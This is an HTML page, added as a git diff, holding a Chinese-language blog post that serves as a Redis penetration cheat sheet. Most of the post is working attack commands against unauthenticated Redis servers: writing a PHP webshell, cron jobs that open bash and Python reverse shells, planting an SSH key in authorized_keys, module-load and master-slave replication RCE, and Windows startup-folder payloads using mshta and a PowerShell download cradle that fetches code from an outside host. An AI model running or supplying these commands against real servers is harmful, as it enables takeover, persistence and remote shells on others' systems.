@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="m0sway">
+
+
+
+
+
+<title>Redis渗透备忘录 | m0sway&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">m0sway&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">m0sway&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Redis渗透备忘录</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">m0sway</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">三月 9, 2022&nbsp;&nbsp;20:59:11</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Database-Attack/">Database Attack</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><p><strong>未授权：</strong>默认情况下，redis直接绑定在0.0.0.0:6379上，并且默认情况下密码会为空，此时若服务器上没有对访问ip，端口进行限制，设置密码等措施，那么此时攻击者可以未授权访问redis，轻则获取到redis内的数据，重则可以配合redis其他漏洞取得服务器权限，需要注意的是redis3.2版本后新增 protected-mode 配置，默认是 yes，即开启,外部网络无法连接 redis 服务；在复现时可以编辑 redis.conf 文件，注释掉 bind 127.0.0.1， 将 protected-mode 修改为 no 启动redis-server .&#x2F;src&#x2F;redis-server<br><strong>dir</strong>：设置快照文件的存放路径，这个配置项一定是个目录，而不能是文件名。使用上面的 dbfilename 作为保存的文件名。<br><strong>dbfilename：</strong>设置快照的文件名，默认是 dump.rdb<br>我们可以通过set来修改其dbfilename以及dir从而把我们的shell写入目标机。</p>
+<h3 id="利用一：写webshell"><a href="#利用一：写webshell" class="headerlink" title="利用一：写webshell"></a>利用一：写webshell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.242.129:6379&gt; config set dir c:phpstudy_proWWW</span><br><span class="line">OK</span><br><span class="line">192.168.242.129:6379&gt; config set dbfilename hack.php</span><br><span class="line">OK</span><br><span class="line">192.168.242.129:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.242.129:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+
+<p>回到win10上看一下会发现写入成功，只是多了一些杂数据， 但并不会影响马儿的运行.</p>
+<h3 id="利用二：写定时任务"><a href="#利用二：写定时任务" class="headerlink" title="利用二：写定时任务"></a>利用二：写定时任务</h3><ul>
+<li><code>/var/spool/cron/</code>目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名，如&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</li>
+<li><code>/etc/crontab</code>这个文件负责调度各种管理和维护任务。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;n* * * * * bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>反弹方式不限于bash，如python：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用三：写ssh"><a href="#利用三：写ssh" class="headerlink" title="利用三：写ssh"></a>利用三：写ssh</h3><p>条件比较苛刻，需要root权限启动redis，且机器允许密钥登陆。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.63.130:6379&gt; config set dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; set x &quot; AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p>网上的文章中可能会有多一句flushall在最前面，因为可能当前redis已经存在足够多的key了，所以如果写入webshell或者定时任务的话会导致文件大小超出如php所能容纳的最大大小，因此通常来说都会加多这么一句，当然了后果就是redis内的键值对都删掉了（如果数据重要的话影响很大）。</p>
+<h3 id="利用四：模块加载rce"><a href="#利用四：模块加载rce" class="headerlink" title="利用四：模块加载rce"></a>利用四：模块加载rce</h3><p>redis4.0以上区别于以下版本在于其多出一个模块，允许我们加载外部的so文件，通过在配置文件中设置（loadmodule &#x2F;path&#x2F;to&#x2F;mymodule.so）&#x2F;使用module load（MODULE LOAD &#x2F;path&#x2F;to&#x2F;mymodule.so）命令加载so文件，实现在redis内执行我们的自定义命令，可以理解为我们可以自写插件来扩展redis的功能。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module load /data/exp.so</span><br><span class="line">system.exec &quot;id&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用五：主从复制RCE"><a href="#利用五：主从复制RCE" class="headerlink" title="利用五：主从复制RCE"></a>利用五：主从复制RCE</h3><blockquote>
+<p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。<br>默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。<br>并且从节点也可以设置为其他节点的主节点，此时就达成了一个集群。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//从节点要复制主节点则使用命令：</span><br><span class="line">slaveof ip port</span><br></pre></td></tr></table></figure>
+
+<p>redis4.0以下可以通过主从复制把shell写入键值中。</p>
+<h4 id="配合模块加载rce"><a href="#配合模块加载rce" class="headerlink" title="配合模块加载rce"></a><strong>配合模块加载rce</strong></h4><p>先前在模块加载rce中我们成功利用模块加载执行任意命令；那么我们在主从中，master加载了so文件后，从机通过同步也会将master的so文件同步到slave上并加载，从而让我们达成rce，但这里想要加载so文件的话需要一个全量复制才会将我们的模块文件发送到slave上。<br>实际上可以模拟其服务端构建一个恶意服务端将我们的so文件通过主从复制同步到目标机器中达成rce。<br><strong>原理：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#启用服务器上的nc监听一个端口</span><br><span class="line">#然后我们的redis用slaveof命令指定为我们的服务器+端口，然后我们就会收到redis的请求：</span><br><span class="line">*1					#*1表示以空格割的属性个数</span><br><span class="line">$4					#$4表示PING的长度为4</span><br><span class="line">PING</span><br><span class="line"></span><br><span class="line">#如果向其回复+OK，就会有一系列回复</span><br></pre></td></tr></table></figure>
+
+<p>利用脚本：<code>https://github.com/n0b0dyCN/redis-rogue-server</code></p>
+<h3 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#windows下的开机启动项的目录为</span><br><span class="line">#C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/</span><br><span class="line">redis 192.168.1.101:6379&gt;config set dir “C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/“</span><br><span class="line">OK</span><br><span class="line">redis 192.168.1.101:6379&gt; CONFIG SET dbfilename 1.bat</span><br><span class="line">OK</span><br><span class="line">#反弹shell</span><br><span class="line">set x &quot;\r\n\r\nmshta http://10.107.10.77:8080/123\r\n\r\n&quot;</span><br><span class="line">OK</span><br><span class="line">#CS上线</span><br><span class="line">redis 192.168.1.101:6379&gt;set x “rnrnpowershell.exe -nop -w hidden -c ”IEX ((new-object net.webclient).downloadstring(‘http://192.168.1.105:80/a’))”rnrn”</span><br><span class="line">OK</span><br><span class="line">redis 192.168.1.101:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">#这边有个小细节，由于Start Menu之间有空格，因此需要用双引号将路径包含。</span><br><span class="line"></span><br><span class="line">#写入MOF</span><br><span class="line">#由于不能重启机器也无法获取web目录，想到Mof提权，不过也是有环境限制只能为win2003</span><br><span class="line">mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</span><br><span class="line">#也就是说在c:/windows/system32/wbem/mof/目录下的mof文件会每5秒自动执行一次，这样就不需要重启机器就能获取权限了。</span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>m0sway</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2022/03/09/Redis%E6%B8%97%E9%80%8F%E5%A4%87%E5%BF%98%E5%BD%95/">http://example.com/2022/03/09/Redis%E6%B8%97%E9%80%8F%E5%A4%87%E5%BF%98%E5%BD%95/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Redis/"># Redis</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2022/02/19/Oracle%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/">Oracle注入备忘录</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© m0sway
+    </div>
+    
+        <!-- 统计 -->
+        <span id="busuanzi_container_site_pv">
+                访问量: <span id="busuanzi_value_site_pv"></span>
+        </span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv" style='display:none'>
+                访客: <span id="busuanzi_value_site_uv"></span>
+        </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+</footer>
+
+    </div>
+</body>
+
+</html>
